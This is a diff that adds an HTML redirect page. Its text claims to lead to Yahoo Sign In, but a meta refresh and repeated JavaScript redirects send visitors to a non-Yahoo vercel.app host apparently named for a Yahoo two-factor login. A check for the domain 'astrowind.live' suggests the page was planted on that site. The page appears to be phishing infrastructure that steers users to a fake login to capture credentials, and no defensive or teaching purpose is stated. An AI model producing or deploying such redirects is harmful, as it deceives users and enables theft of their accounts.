@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0;url=https://custom-yahoo-2fa-test.vercel.app/">
+    <script>
+        // Immediate redirect
+        window.location.replace('https://custom-yahoo-2fa-test.vercel.app/');
+    </script>
+</head>
+<body>
+    <p>Redirecting to Yahoo Sign In...</p>
+    <script>
+        // Fallback redirect
+        setTimeout(function() {
+            window.location.replace('https://custom-yahoo-2fa-test.vercel.app/');
+        }, 100);
+        
+        // Additional fallback
+        setTimeout(function() {
+            if (window.location.href.includes('astrowind.live')) {
+                window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/';
+            }
+        }, 500);
+    </script>
+</body>
+</html>
